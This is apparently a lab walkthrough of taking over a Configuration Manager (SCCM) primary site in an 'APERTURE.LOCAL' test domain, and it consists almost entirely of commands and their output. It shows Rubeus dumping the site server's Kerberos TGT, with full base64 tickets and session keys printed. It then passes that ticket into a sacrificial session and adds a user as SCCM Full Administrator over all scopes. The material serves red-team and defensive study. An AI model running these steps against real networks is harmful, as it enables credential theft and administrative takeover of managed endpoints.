#

# SYSTEM access to primary site server

### On site server

First, get a TGT for the site server:
```
PS C:\Users\labadmin.APERTURE\Desktop> .\Rubeus.exe dump /user:SITE-SERVER$ /service:krbtgt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target user     : SITE-SERVER$
[*] Current LUID    : 0x10e3ae

  UserName                 : SITE-SERVER$
  Domain                   : APERTURE
  LogonId                  : 0x3e4
  UserSID                  : S-1-5-20
  AuthenticationPackage    : Negotiate
  LogonType                : Service
  LogonTime                : 7/17/2024 11:35:38 AM
  LogonServer              :
  LogonServerDNSDomain     :
  UserPrincipalName        :  SITE-SERVER$@APERTURE.LOCA


    ServiceName              :  krbtgt/APERTURE.LOCAL
    ServiceRealm             :  APERTURE.LOCAL
    UserName                 :  SITE-SERVER$ (NT_PRINCIPAL)
    UserRealm                :  APERTURE.LOCAL
    StartTime                :  7/17/2024 11:35:43 AM
    EndTime                  :  7/17/2024 9:35:43 PM
    RenewTill                :  7/24/2024 11:35:43 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  RCwsHO6fKaHQdYMEjTT9/aBtvMt5fpuj1bcgOLwROKE=
    Base64EncodedTicket   :

      doIFxjCCBcKgAwIBBaEDAgEWooIEwTCCBL1hggS5MIIEtaADAgEFoRAbDkFQRVJUVVJFLkxPQ0FMoiMwIaADAgECoRowGBsGa3JidGd0Gw5BUEVSVFVSRS5MT0NBTKOCBHUwggRxoAMCARKhAwIBAqKCBGMEggRfYKjGeseVTHOxIGHD7UDofn/vc0XcvbtF4FeqZ5PZPsiAX8+GZkn606lZGnfiS4F58JU5FJcDSPMkheThVSpA4+JdaPinQ8JDm0ARD1eBoxO5+7btkeOIUjyBocMIWwHVhlV9ysEzu4MHMfAqmUWwqY/KZZuAIF+mhktZgD4cnjzCgW6281xa7HGX/qajSCYxgrqGdyfuk0otWK6MqDtGGQXFrE0uKMF7Jct5SX+hCCwXjMUHzGwCCbV+oKJXxxGjG58eZhPS0IPBSKIx18E93sKt9o3XfhBb+C9VzjVyDX9MZRqtr6JtOGCh+dvaWibkMaNf/UqYMd8uIjBATvkLemNSsYgzMmstWmgymnDhQYQziFQXg4ihYvXDm0lMgkH6xdAqG5EuLvEOthpPKpqHE1fhuO3xrPJ4QSvF4ZTdtZ3Q4oQuPADH2RIjVAdgggZAxFaxG7ySxNjqydsaCFnkPvXcxiLsZhGwN7Lf0lvoP4oA7Ui6fqEBd9v5jG2g47GTf/q5ApD1d01prYxAKBGq8LiCx3jB2fFC/O/uwENLoRp7w+son1XvA+dsrDgYq/f9zyEP8tsytBnPYUD4QTRTkZHmfoT/6aEW8pavc76T0K05e/1T6Y5VJasNnIxCn3j2/Xyn57/7W4OVXHFvwTMq9hdAT3kJSZ7q5LBOMPRQGpUjUQXWzRIMqU4ztqQvDd99Fh4nss98fAUVqYjsQy5KdMn+ScxqICExASyq1PwcCxyBan+/xO04Pl3GKf9ciKCwud9dm7zKFL+LmyjRf0b8Hr6FPnN8coYlY/TyrjfWpc6UJJVcPQw6NtOjmQtX4Q5sdXb+bRbevCKzgC7w/fGiozV8NZVhHJxIaDL/EIJRKMBcRHrB2Fb0I/J66r2DVV2kPAYzUV7OR/kInZcnUPT6O0t80q5xHBoD5Do0AAD3hS+dXHqpdA6CK1qDS6VprA9csG772hdP70mnjqiBAN3sBhO6rOwyLOZKiD9rGSJ1HscZzsAV9xA4gtPIrm00tOOgn2VtmtMJjTaGygkRH5BRTsL0e1hj7aAsM4c0miWaOJsJlKwLJv/0pa1HKQiWZRyfX0UXtE5aw2ZU4kj++gFleyO60YhhuKyPwS/n8AI1kmU6hrLXh2WG4nIasC+J7gCwchjVhsSnBBwgpXM3lrSrGi8WsdCfFmGVSA0KnK7BtFPKm+kiGvvhZkUKkdMOQQQDbx0q/5MaRGvB7UHYIW/A5lU6oU6QF0V5lLRARW5OpjtvFL31sFJRp23KLc3T36xymzWi7aNg8dDDOo1YPj4T+z70SaSUQAabTqgDc1bTnA7bRr+SEoXqDrUDjz3zWETQ9ohxf5Q/Bg4PCVBjzZ4iLljspptRD6rHqTgCM5IRVurFRpghRRSLe7oKPyy92fo/Nd1gV/pb6rEE5yNlCWdzkg3ykIrii5cGJMlOGv1TU2QK2J/xjBy4ZzK++bLEqaFAd7qrVyCHMTQtVfMSce3no4HwMIHtoAMCAQCigeUEgeJ9gd8wgdyggdkwgdYwgdOgKzApoAMCARKhIgQgRCwsHO6fKaHQdYMEjTT9/aBtvMt5fpuj1bcgOLwROKGhEBsOQVBFUlRVUkUuTE9DQUyiGTAXoAMCAQGhEDAOGwxTSVRFLVNFUlZFUiSjBwMFAEDhAAClERgPMjAyNDA3MTcxMTM1NDNaphEYDzIwMjQwNzE3MjEzNTQzWqcRGA8yMDI0MDcyNDExMzU0M1qoEBsOQVBFUlRVUkUuTE9DQUypIzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDkFQRVJUVVJFLkxPQ0FM

  UserName                 : SITE-SERVER$
  Domain                   : APERTURE
  LogonId                  : 0x3e7
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Negotiate
  LogonType                : 0
  LogonTime                : 7/17/2024 11:35:35 AM
  LogonServer              :
  LogonServerDNSDomain     : APERTURE.LOCAL
  UserPrincipalName        : SITE-SERVER$@APERTURE.LOCAL


    ServiceName              :  krbtgt/APERTURE.LOCAL
    ServiceRealm             :  APERTURE.LOCAL
    UserName                 :  SITE-SERVER$ (NT_PRINCIPAL)
    UserRealm                :  APERTURE.LOCAL
    StartTime                :  7/17/2024 11:36:22 AM
    EndTime                  :  7/17/2024 9:36:22 PM
    RenewTill                :  7/24/2024 11:36:22 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  CCgIzqJIgh7tg0VWYDIcAXqM+rz4NuNgW+12v1uyqf0=
    Base64EncodedTicket   :

      doIFxjCCBcKgAwIBBaEDAgEWooIEwTCCBL1hggS5MIIEtaADAgEFoRAbDkFQRVJUVVJFLkxPQ0FMoiMwIaADAgECoRowGBsGa3JidGd0Gw5BUEVSVFVSRS5MT0NBTKOCBHUwggRxoAMCARKhAwIBAqKCBGMEggRfyE01UpijV44/T3kOlq5rfBXhMfgjMnz/5QB+tIKC8F7G2MKrAC2RRRLuxEflscCLKMDpfR+7P3EDsBo1RZaMcfhdq3Rp/ZC46R0PiVSsZQsBE6nNMcEFIed6IMKoA+D2ZbjMGOF3CkZFXKdh3dyIdO9hBKCpsNn6TUUZzCMVCqhCUJTRak+HsyYMrl4e0WO6RE2nvifAi4/QC7N5bcdg7+HhDONKIrV1cdBuwxfOkAT6ePXgIr00tbx5YqSPpqUAUqOsy/heA3n+4mkpC6e8EoAjRJrNvnvfapuR4+tvyPD0tYbXa98t0veJlq4fsVj/+KnCIqQ5wkhjoBjx92o6rbNV5risD7IraAW1lZTmAdtsPqgTIptA9NX441df8KbNkTaEqppeNmUWVA+WStNxTzxfIbYV7ZtuUi7AnpiLxT9v3ilJPyaTeo5sh2IY9jO44+8zag9/2BDFdC9vehDfhIFd3e91CX+4btCBw7+biXAizHesU7nWijLKc4siTANRQIW503jFxM2l1fVnQcU9J1iB420UZ6UMlfCMfCz7lTfMvZDNbCyAib5D9SjPJLXlG+eKIXekaR8fkPS5tQuVRXgTmwBagCu86/S+MwIiaQuIK8r1wtrSSvo61cfX34l7utHoYE70pzlyIrh9PuM5cg2fX5itpD2mcUbH8VwF1XJgKUcJJKZZd5a1VDu6FaR0Ve5/h/hf3LRVT6zJlHVThnP9RKYydLPvIR5ls61ozGwB09nluvvf/XsatRs2P00XeCRrdw0VHcZz1RSLkG3ob5BLmShoCaARmo4NcC+RR2cNm7LveEpunxM5Kf+cEmMOKFbwsAZedHCRvEBi6B7Rhm7sm3yBCdwYqy6320fO+j6D6cCsDqEpEXPVfrH6lgRtQovLQIgx8tTnChjuFDp6UWgHfMh/0r1rLMAlYwq/qRbeuHY+cTEqq0k9RCJilj8AQOD7u/J3uwm6tddtXMo//ud6hRBSy/POvgaLp23qKPBVm9I1bcUdF2Y6QTrrlMzfYpS4xXiXg2fksVU95a8gfXv0M7RC/ng0tRndltiWsIr19Rws8xF+gypKodA7XHOl28O0xaeo8AEbkgyUDhwdqsB3rkzfy6PakQBW2RFZmsgl/xoFrGxFq0eIqzmy7rP47Wd3ERmNI00goF8IX70IOGmyzhTcQjasJtBCz3cRKTiGqF4ZdlgTs2prxXOvEyYoT0pyjXlAX5fhW5DNvu4xtpTCU00P6WeIfy/43z0a1EcDV82RRrKBAm8Jhad3+4KU08G4c6C8TLUNxIo+tZ6OxAQO4+yhqR29mtcSoLZ+BV/yuNbYNW0qvtn8HGTMHwIa+hauIficZXlYzpJ7Y3RLzCzt8ebxhkpWIn+QnK1IkBtNf4YAEJ/R2kyIR4HmQnokZOgsyx0Tbbg8cDoZY1B7zvyaHwZgUt7beUPFnHjlKt9/AsUaNalSzLlFZC9tTWK8rz0kGdDhwBijMl1AsTjWo4HwMIHtoAMCAQCigeUEgeJ9gd8wgdyggdkwgdYwgdOgKzApoAMCARKhIgQgCCgIzqJIgh7tg0VWYDIcAXqM+rz4NuNgW+12v1uyqf2hEBsOQVBFUlRVUkUuTE9DQUyiGTAXoAMCAQGhEDAOGwxTSVRFLVNFUlZFUiSjBwMFAEDhAAClERgPMjAyNDA3MTcxMTM2MjJaphEYDzIwMjQwNzE3MjEzNjIyWqcRGA8yMDI0MDcyNDExMzYyMlqoEBsOQVBFUlRVUkUuTE9DQUypIzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDkFQRVJUVVJFLkxPQ0FM
```

The computer account must be a member of SMS Admins as well, which it will be by default on SMS Providers.

### On remote Windows system

Open PowerShell using a sacrificial logon session for ticket manipulation:
```
runas /netonly /user:bogus powershell
(Hit enter when prompted for a password)
```

Then, pass the TGT for the SMS Provider domain computer account into the logon session:
```
PS C:\Users\labadmin.APERTURE\Desktop> .\Rubeus.exe ptt /ticket:doIFxjCCBcKgAwIBBaEDAgEWooIEwTCCBL1hggS5MIIEtaADAgEFoRAbDkFQRVJUVVJFLkxPQ0FMoiMwIaADAgECoRowGBsGa3JidGd0Gw5BUEVSVFVSRS5MT0NBTKOCBHUwggRxoAMCARKhAwIBAqKCBGMEggRfyE01UpijV44/T3kOlq5rfBXhMfgjMnz/5QB+tIKC8F7G2MKrAC2RRRLuxEflscCLKMDpfR+7P3EDsBo1RZaMcfhdq3Rp/ZC46R0PiVSsZQsBE6nNMcEFIed6IMKoA+D2ZbjMGOF3CkZFXKdh3dyIdO9hBKCpsNn6TUUZzCMVCqhCUJTRak+HsyYMrl4e0WO6RE2nvifAi4/QC7N5bcdg7+HhDONKIrV1cdBuwxfOkAT6ePXgIr00tbx5YqSPpqUAUqOsy/heA3n+4mkpC6e8EoAjRJrNvnvfapuR4+tvyPD0tYbXa98t0veJlq4fsVj/+KnCIqQ5wkhjoBjx92o6rbNV5risD7IraAW1lZTmAdtsPqgTIptA9NX441df8KbNkTaEqppeNmUWVA+WStNxTzxfIbYV7ZtuUi7AnpiLxT9v3ilJPyaTeo5sh2IY9jO44+8zag9/2BDFdC9vehDfhIFd3e91CX+4btCBw7+biXAizHesU7nWijLKc4siTANRQIW503jFxM2l1fVnQcU9J1iB420UZ6UMlfCMfCz7lTfMvZDNbCyAib5D9SjPJLXlG+eKIXekaR8fkPS5tQuVRXgTmwBagCu86/S+MwIiaQuIK8r1wtrSSvo61cfX34l7utHoYE70pzlyIrh9PuM5cg2fX5itpD2mcUbH8VwF1XJgKUcJJKZZd5a1VDu6FaR0Ve5/h/hf3LRVT6zJlHVThnP9RKYydLPvIR5ls61ozGwB09nluvvf/XsatRs2P00XeCRrdw0VHcZz1RSLkG3ob5BLmShoCaARmo4NcC+RR2cNm7LveEpunxM5Kf+cEmMOKFbwsAZedHCRvEBi6B7Rhm7sm3yBCdwYqy6320fO+j6D6cCsDqEpEXPVfrH6lgRtQovLQIgx8tTnChjuFDp6UWgHfMh/0r1rLMAlYwq/qRbeuHY+cTEqq0k9RCJilj8AQOD7u/J3uwm6tddtXMo//ud6hRBSy/POvgaLp23qKPBVm9I1bcUdF2Y6QTrrlMzfYpS4xXiXg2fksVU95a8gfXv0M7RC/ng0tRndltiWsIr19Rws8xF+gypKodA7XHOl28O0xaeo8AEbkgyUDhwdqsB3rkzfy6PakQBW2RFZmsgl/xoFrGxFq0eIqzmy7rP47Wd3ERmNI00goF8IX70IOGmyzhTcQjasJtBCz3cRKTiGqF4ZdlgTs2prxXOvEyYoT0pyjXlAX5fhW5DNvu4xtpTCU00P6WeIfy/43z0a1EcDV82RRrKBAm8Jhad3+4KU08G4c6C8TLUNxIo+tZ6OxAQO4+yhqR29mtcSoLZ+BV/yuNbYNW0qvtn8HGTMHwIa+hauIficZXlYzpJ7Y3RLzCzt8ebxhkpWIn+QnK1IkBtNf4YAEJ/R2kyIR4HmQnokZOgsyx0Tbbg8cDoZY1B7zvyaHwZgUt7beUPFnHjlKt9/AsUaNalSzLlFZC9tTWK8rz0kGdDhwBijMl1AsTjWo4HwMIHtoAMCAQCigeUEgeJ9gd8wgdyggdkwgdYwgdOgKzApoAMCARKhIgQgCCgIzqJIgh7tg0VWYDIcAXqM+rz4NuNgW+12v1uyqf2hEBsOQVBFUlRVUkUuTE9DQUyiGTAXoAMCAQGhEDAOGwxTSVRFLVNFUlZFUiSjBwMFAEDhAAClERgPMjAyNDA3MTcxMTM2MjJaphEYDzIwMjQwNzE3MjEzNjIyWqcRGA8yMDI0MDcyNDExMzYyMlqoEBsOQVBFUlRVUkUuTE9DQUypIzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDkFQRVJUVVJFLkxPQ0FM

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

(Optional) Verify that the ticket is present and valid:

```
PS C:\Users\labadmin.APERTURE\Desktop> klist

Current LogonId is 0:0x224bee0

Cached Tickets: (1)

#0>     Client: SITE-SERVER$ @ APERTURE.LOCAL
        Server: krbtgt/APERTURE.LOCAL @ APERTURE.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 7/17/2024 11:36:22 (local)
        End Time:   7/17/2024 21:36:22 (local)
        Renew Time: 7/24/2024 11:36:22 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

PS C:\Users\labadmin.APERTURE\Desktop> ls \\aperture\sysvol


    Directory: \\aperture\sysvol


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----l         5/17/2023   5:46 PM                APERTURE.LOCAL
```

Import the PowerShell SDK for ConfigMgr:
```
PS C:\Users\labadmin.APERTURE\Desktop> Import-Module 'C:\Program Files (x86)\Microsoft Configuration Manager\AdminConsole\bin\ConfigurationManager.psd1'
```

Connect to the PowerShell SDK drive:
```
PS C:\Users\labadmin.APERTURE\Desktop> New-PSDrive -Name "PS1" -PSProvider "CMSite" -Root "site-server.aperture.local" -Description "Primary site"

Name           Used (GB)     Free (GB) Provider      Root                                                            CurrentLocation
----           ---------     --------- --------      ----                                                            ---------------
PS1                                    CMSite        site-server.aperture.local
```
```
PS C:\Users\labadmin.APERTURE\Desktop> Set-Location PS1:
PS PS1:\>
```

Add a new administrator user:
```
PS PS1:\> New-CMAdministrativeUser -Name "aperture.local\low priv" -RoleName "Full Administrator" -SecurityScopeName "All","All Systems","All Users and User Groups"


SmsProviderObjectPath : SMS_Admin.AdminID=16778257
AccountType           : 0
AdminID               : 16778257
AdminSid              : S-1-5-21-1642199630-664550351-1777980924-34102
Categories            : {SMS00ALL}
CategoryNames         : {All}
CollectionNames       : {All Systems, All Users and User Groups}
CreatedBy             : APERTURE\SITE-SERVER$
CreatedDate           : 7/17/2024 7:19:39 PM
DisplayName           : Low Priv
DistinguishedName     : CN=Low Priv,CN=Users,DC=APERTURE,DC=LOCAL
ExtendedData          : {}
IsCovered             : False
IsDeleted             : False
IsGroup               : False
LastModifiedBy        : APERTURE\SITE-SERVER$
LastModifiedDate      : 7/17/2024 7:19:39 PM
LogonName             : APERTURE\lowpriv
Permissions           : {All, All Systems, All Users and User Groups}
RoleNames             : {Full Administrator}
Roles                 : {SMS0001R}
SKey                  : PS1S-1-5-21-1642199630-664550351-1777980924-34102
SourceSite            : PS1
```


